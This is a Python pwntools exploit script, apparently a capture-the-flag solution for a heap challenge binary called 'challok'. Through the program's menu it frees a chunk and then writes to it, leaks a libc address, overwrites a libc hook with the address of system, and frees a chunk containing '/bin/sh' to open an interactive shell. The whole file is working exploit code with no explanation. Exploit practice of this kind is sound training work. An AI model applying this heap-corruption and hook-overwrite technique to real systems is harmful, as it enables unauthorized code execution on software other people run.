#!/usr/bin/env python3

from pwn import *

exe = ELF('challok', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()

def buy(size, data):
    slna(b'> ',1)
    slna(b'Size: ',size)
    sa(b'Content: ',data)

def w(data):
    slna(b'> ',2)
    sa(b'Content: ',data)

def er():
    slna(b'> ',3)

def read():
    slna(b'> ',4)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+78
        b*main+192
        b*main+407
        b*main+488
        
        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # input()
        # return p


if args.REMOTE:
    p = remote('')  
else:
    p = process([exe.path])
GDB()

#Libc leak
buy(0x68, b'a'*8)
er()
w(p64(0x40402d))
buy(0x68, b'a'*8)
buy(0x68, b'a'*3)
read()
ru(b'a'*3)
libc_leak = u64(rl()[:-1]+b'\0\0')
info("Libc leak: "+hex(libc_leak))
libc.address = libc_leak - 0x39c540
info("Libc base: "+hex(libc.address))
hook = libc.address + 0x39d7a8

#Hook Overwrite
p0 = b'a'*3 + flat(libc_leak, b'a'*8, 0x50, hook)
w(p0)
w(p64(libc.sym.system))

#Get shell
buy(0x50, b'/bin/sh\0')
er()

p.interactive()